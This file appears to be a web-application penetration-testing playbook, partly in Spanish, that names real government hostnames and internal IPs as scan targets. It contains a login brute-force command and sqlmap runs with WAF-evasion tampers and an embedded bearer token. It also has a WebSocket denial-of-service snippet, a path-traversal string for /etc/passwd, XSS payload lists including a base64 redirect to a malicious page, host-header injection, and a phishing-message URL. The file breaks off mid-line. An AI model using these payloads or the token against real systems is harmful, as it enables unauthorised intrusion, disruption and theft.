## Introduction

Acerca de las evidencias, deben de tomarse capturas de pantalla, y guardar un texto que explique la imagen de evidencia.

## Automated scans

### OWASP ZAP


```
sudo apt install zaproxy
zaproxy -cmd -addoninstallall  
```
 
Usage:

In Python interpreter.

```
zaproxy -cmd -quickurl https://miconsuladoadminqa.sre.gob.mx/ingresar -quickprogress -quickout ~/ozap-report-$(date +"%Y-%m-%d-%I-%M-%p").html

zaproxy -cmd -quickurl https://fis2022apiseg.sre.gob.mx -quickprogress -quickout ~/ozap-report-$(date +"%Y-%m-%d-%I-%M-%p").html && \
zaproxy -cmd -quickurl https://fis2022seg.sre.gob.mx -quickprogress -quickout ~/ozap-report-$(date +"%Y-%m-%d-%I-%M-%p").html && \
zaproxy -cmd -quickurl https://fis2022adminseg.sre.gob.mx -quickprogress -quickout ~/ozap-report-$(date +"%Y-%m-%d-%I-%M-%p").html && \
echo "Finished"

mv /home/kali/ozap-report-* /mnt/c/Users/ohernandez/Desktop/
```

Scan web application like nessus.
Export HTML preferred to use then your custom format.

### NESSUS

```
sudo apt update && sudo apt upgrade
curl -JLO 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.3.0-debian9_amd64.deb'
sudo dpkg -i Nessus*
 
sudo /opt/nessus/sbin/nessus-service
```
 
Go to https://localhost:8834
 
 
Scan target mist virutal host 

miconsuladoapiqa.sre.gob.mx[172.18.217.6], miconsuladoqa.sre.gob.mx[172.18.217.6], miconsuladoadminqa.sre.gob.mx[172.18.217.6]


### Lighthouse 
```
lighthouse <url>
lighthouse --chrome-flags="--headless" <url>
```

## Fingerprint


### Web application exploration

Navigation.

Identify user flows.

### Ports identification

Use NMAP.

### Wireshark analysis exploration


```
ip.addr == 172.25.118.65
tcp.dstport == 443
tcp.port==443 && ip.addr == 172.25.118.65
```

### Hosted and related applications identification

Virtual hosts maybe.

```
nmap -sV --script=http-enum <target>
```

### User roles identification

Identify user roles in application names, ids.

### Web application technologies recognition

Use Walapalizer chrome extension.

\href{https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg}{Enlace de la extensiÃ³n

### Search for known vulnerabilities of recognized technologies

https://security.snyk.io/
https://www.exploit-db.com/
https://www.cvedetails.com/
https://nvd.nist.gov/

Use developer tools:

Ms edge > Lighthouse > Generate report with snink analysis

### Extraction of metadata from downloadable files test

```
exiftool sectorprivado.pdf | grep 'Creator\|Producer\|Windows|\Linux|\OS|\C:|\http'>
```

### Extraction of embedded files test

```
pip install docscraper 
sudo apt install exiftool


import docscraper 
allowed_domains = ["vulnerable-site.com "]
start_urls = ["https://vulnerable-site.com /index.php/rmpe"]
extensions = [".pdf", ".docx", ".doc", ".xls",".xslx",".ppt",".pptx", ".txt", ".csv", ".json"]
docscraper.crawl(allowed_domains, start_urls, extensions=extensions)
```

```
wget https://raw.githubusercontent.com/x4nth055/pythoncode-tutorials/master/web-scraping/link-extractor/link_extractor.py
python3 link_extractor.py https://github.com -m 2
curl https://vulnerable-site.com /index.php/rmpe/article/view/62/58 > output && cat output | tr '";>' '\n' | grep -Eo '(http|https|www):(.*)'
```

Descargar con el nombre propuesto por el servidor en lugar de wget:
```
curl -JLO https:\/\/vulnerable-site.com \/index.php\/rmpe\/article\/download\/62\/58\/100
```

Search for usernames:
```
exiftool sectorprivado.pdf | grep 'Creator\|Producer\|Windows|\Linux|\OS|\C:|\http'
```


### Data extraction from Javascript Source Code Test

Installation of tools:

```
pip install jsbeautifier
js-beautify file.js
```

Encription keys search:
```
curl -s https://vulnerable-site.com/js/app.dca99adc.js | js-beautify | awk '{$1=$1;print}' | grep -iE  "crypt|aes|hmac|md5|sha512|sha256|sha1"

echo -n 'hsBI69O90juKhpPx' | md5sum 
echo -n 'ZMQfCfRnhWZoamQDBWYrZyNqb5Tpr3' | md5sum
```

sudo apt install npm 


node criptojs.js -def data.txt -key "190fdff54d48da67dff47a8f5a84b402"

In case the code is obsfuscated:

- JavaScript Deobfuscator (deobfuscate.io)
- de4js | JavaScript Deobfuscator and Unpacker (lelinhtinh.github.io)


1. https://deobfuscate.relative.im/
2. https://deobfuscate.io/
3. https://lelinhtinh.github.io/de4js/


```
curl https://gist.github.com/relative/79e392bced4b9bed8fd076f834e06dee/raw/obfuscated.js -o ./obfuscated.js

sudo npm install -g js-deobfuscator
synchrony deobfuscate  obfuscated2.js
```

npm install deobfuscator
npm install de4js

https://www.npmjs.com/package/de4js/v/1.10.4

Encrypt and Decrypt with Key in Online | Online Encryption and Decryption (bitcompiler.com)
JSON Web Tokens - jwt.io

Si esta en cifrado en la URL entonces URL Parameters o algo asi usar primero un URL Decoder URI.

Go to the folder with the program:

```
cd bin/de4js
```
Start the server:

```
npm start
```

## Application DOS

### Delete important records test

Burps Suite repeater.

### Delete all possible data 

Burps Suite repeater.


### WebSocket Denial of Service Test

```
const WebSocket = require('ws');
const net = require('net');
const wss = new WebSocket.Server({ port: 3000 }, function () {
  const payload = 'constructor';  // or ',;constructor'
const request = [
'GET / HTTP/1.1',
'Connection: Upgrade',
'Sec-WebSocket-Key: test',
'Sec-WebSocket-Version: 8',
`Sec-WebSocket-Extensions: ${payload}`,
'Upgrade: websocket',
'\r\n'
  ].join('\r\n');
const socket = net.connect(3000, function () {
socket.resume();
socket.write(request);
  });
});  
```


## Access Control


### Application stored cache on the client verification 

Go to page panel, administration or whatever you want, close session and return.


### Folders discover test

```
sudo apt install dirb
```

Usage:

```
dirb "https://cumbreap2022seg.sre.gob.mx" /usr/share/wordlists/dirb/common.txt
```

```
sudo apt install wordlists
ls -lh /usr/share/wordlists/

sudo apt install dirb 

sudo apt install dirbuster
sudo apt install gobuster


dirb "https://cumbreap2022seg.sre.gob.mx" /usr/share/wordlists/dirb/common.txt
```

## Authentication

### Login brute force test

GitHub - FlorianBord2/Hatch-python3-optimised: Hatch is a brute force tool that is used to brute force most websites


```
git clone https://github.com/FlorianBord2/Hatch-python3-optimised
```

```
python main.py --website "https://vulnerable-site.com /login" --passlist  passlist.txt  --username "cibersoc_3tin"  --usernamesel "body > div > div > div > div:nth-child(2) > form > div:nth-child(1) > div > div:nth-child(1) > div > div > input" --passsel "body > div > div > div > div:nth-child(2) > form > div:nth-child(1) > div > div:nth-child(2) > div > div > input" --loginsel "body > div > div > div > div:nth-child(2) > form > div:nth-child(2) > div > div > div > button > span"
```

### Usernames enumeration

Test more than 10 usernames.

### WebSocket Cross-site hijacking Test

\nonumsidenote{Usually a web aplication could work with HTTP 1.0, HTTP 2.0, WebSockets and WebHooks.
Since a cross-site WebSocket hijacking attack is essentially a CSRF vulnerability on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.

In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.
For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie


```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

\begin{fullwidth} % Use the whole page width
The Sec-WebSocket-Key header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.
If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site. What happens next in the attack depends entirely on the application's logic and how it is using WebSockets. The attack might involve:
\end{fullwidth



## Configuration Management

### Search for default configurations test

Search for routes that doesn't exist.

https://url/donotexist

### Search for technology on headers response

- Apache
- CentOS
- Open Source Applications

## Error Handling

### URL overflow
```
........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................../etc/passwd
```

### Not found resource
```
/url/donotexist
```


### Not permision to resource
```
sudo apt-get install sqlmap
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
```


\%20 white space

```
/%20%2A%2A%2A%20Por%20favor%20redirigete%20a%20la%20siguiente%20%20direccion%20%20(copia%20%20y%20%20pega):%7F___%20www.sitiomalo.com%20___%20%2A%2A%2A%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%20Ignore%20the%20error%20
```
```
_________***Por_favor_redirigete_a_la_siguiente_direccion_(copia_y_pega):___www.sitiomalo.com___***
```
### Bad request

```
/%20%20%
```

## Data protection



### HTTP Redirection test

```
curl -ILs "http://$1" | grep -Pi "^HTTP+|Location|X-CDN|Connection"
```


###  TLS/SSL Verification Test

```
sudo apt install tlssled
tlssled vulnerable-site.com 443
```

SSLSCAN
```
sudo apt install sslscan
sslscan https://vulnerable-site.com 
```

### HTTP Security Headers Verification

SHCHEK
```
pip3 install shcheck
shcheck.py https://insecurity.blog
```

### HTTP Host Header Injection Test

CURL
```
curl -s -D - --header 'Host: theevilsite.com' https://vulnerable-site.com > output && cat output | grep --color -E '^|theevilsite.com' 
```


### HTTP Options Method Verification

Add nmap to Kali Linux Subsystem
```
alias nmap='"/mnt/c/Program Files (x86)/Nmap/nmap.exe"'
```

NMAP
```
nmap --script http-methods <target>
```

In specific path
```
curl -i -X OPTIONS http://example.org/path
```

### HTTP Trace Method Check

```
curl --insecure -v -X TRACE https://www.google.com/
```

La respuesta esperada para que no este activo es: 405 Method Not Allowed

### HTTP Cookies Verification

CURL
```
curl 'https://vulnerable-site.com' -o /dev/null --dump-header - 2>&1 | grep -i "set-cookie"
curl -X GET -L 'https://intgra.sre.gob.mx/ingresar/' -o /dev/null --dump-header - 2>&1 | grep -i "set-cookie"
```

### Subresource Integrity (SRI)  Implementation Verification

CURL
```
sudo apt install tidy
curl -s https://laysent.github.io/subresource-integrity-demo/integrity.html | tidy  -indent --indent-spaces 2 -quiet --tidy-mark no | grep "integrity="
```


### WebSocket Unencrypted Communications Verification

Search for headers: Sec-WebSocket-


## Input validation

### SQL Injection Test

```
sudo apt-get install sqlmap


sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables


sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs   --headers= "Authorization: Bearer: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiIxIiwianRpIjoiOTZhMTJlZjcxNGUzZmUwMTdlOWZiMzZkOTZiMTBkZjVjNDIwYTQ3OWU5N2IwYjRmNGNhNDE3MTM5MzZlNzNjOWUwODk0ZDFjZTFlMjVmMTQiLCJpYXQiOjE2NjEyNzY5MjAuMDY5MDgxLCJuYmYiOjE2NjEyNzY5MjAuMDY5MDgzLCJleHAiOjE2OTI4MTI5MjAuMDY1MjQsInN1YiI6IjE3Iiwic2NvcGVzIjpbXX0.gJmnuUp03Y0ZL_3enF3frFLWppUfN5GIEk-xGbB4YZFulWXBeYglBxMu6vCpCZ-hGP0HqeeGYGUKUgUTJmI3eyhyln-NpDh2vqc50Dy7BEwMPGRl4BEHVGJrlQ2O6G_AOvCFP977SJS4vcUrn4ZtO9jigywy0-OTm8_z-M9gC-vfP-WYZ6hx-_QdFOzTZBYpbtgMxIaUh38ysnhsSsUSH-eD7kUJQmC822Xc9qkxwhkK3VNVfMUJByM3xi2gVtmCvtOFXzMejwkdiiut6bZtLNNxZT9KIxjL7OzD87jkIiyWnNFO5c_krp4GEQM1cYmTgfS10M-IR2hnhBHAXXj46lPpGkjNkqindspxDliVRpV78PVeZlkkM0q3Np9Q_-92pSlQkEVR-0xlAf5z2OhuGfYd0FuhVlDFYu5BNwer71QJX9H0vCTYnseA_LFd4GxKm9YiLey8SBXid84dJ0fiH5JF1rq64oiIOVmTnO198mEYhGIYy5UQH-HogKIGGUL2Hi0TOzW24PJnZBrMe_YY1HLsk6BPg-xfaBqbDXxMJxdJ1-vFeU200Gtxfo9crJ11wKwvWy90Q230hUXWCKNaRKeLNcKv9RWQq2_uCUjNAzcuGZsq69AwfYQLc4MvOcW5QZBt_UVARyGVSBytLOJykNWjIUqjCuXp7PpQ6BpmgEc" --method=POST --proxy="http://127.0.0.1:8080"


sqlmap -r request.txt  --proxy="http://172.24.176.1:8080" --random-agent --level 2 --risk 2 --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --time-sec 15

sqlmap -r request.txt  --proxy="http://172.24.176.1:8080"
```


### Cross Site Scripting Validation Test

```
<script>javascript:alert('XSS HACKED')</script>
javascript:alert('XSS HACKED')
```

### Code injection characters and strings test

```
' ; -- ` */ /* -- or # ' OR '1 ' OR 1 -- - OR 1=1 ;%00<script>javascript:alert(123456789)</script> (&(ou=admin)(| (user=Freeman)))
```



### Multiple payloads test
```
<a href='www.evil-site.com'>www.evil-site.com link</a>
<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIEhBQ0tFRCIpOzwvc2NyaXB0Pg=='>www.evil-site.com link</a>



<a href="javascript:document.write('<image src =q onerror=prompt(8)>')">evil link</a>
<a href="javascript:let pdfWindow = window.open('');pdfWindow.document.write( `<iframe width='100%' height='100%' src='data:text/html;base64, ` + encodeURI(`PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=`) + `'></iframe>` )
">evil link</a>
<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4='>clic on xss</a>
<script>javascript:alert(123456789)</script>
<image src =q onerror=prompt(8)>
<img src="javascript:alert('XSS');">
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe><textarea></iframe><img src='' onerror='alert(document.domain)'>
</textarea><script>alert(/xss/)</script>
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);" onerror="javascript:alert(1)"  onclick="javascript:alert(1)">
<iframe><textarea></iframe><img src="" onerror="alert('14/04/2022')">

<image src =q onerror=`window.parent.location = 'http://127.0.0.1:8000/index.html'`>
<image src =q onerror='javascript:alert(1223456789)'>
```

Example: Base64 XSS payload
```
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIEhBQ0tFRCIpOzwvc2NyaXB0Pg==
```

Insert value in HTML element with javascript:
```
document.getElementById("f_464cf370-896e-4af1-a0b1-3f4621ff0a36").value = '<script>javascript:alert(123456789)</script>';
```

### Cross Site Scripting Test

IMPORTANTE, para continuar por favor use clic derecho en este vÃ­nculo y abralo en una nueva ventana.

```
data:text/html,<script>alert('XSS example');</script>
```

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIEhBQ0tFRCIpOzwvc2NyaXB0Pg==
```

```
data:text/html;base64,PHNjcmlwdD5jb25maXJtKCJQcm9udG8gc2VyYXMgcmVkaXJlY2Npb25hZG8gcG9yIGNpYmVyc29jXzN0aW4gIik7d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vb3N2YWxkb2hkem0uZ2l0aHViLmlvL3NpdGlvLW1hbG8vIik7PC9zY3JpcHQ+Cg==
```

### Defacement Test PoC

```
var b64code = 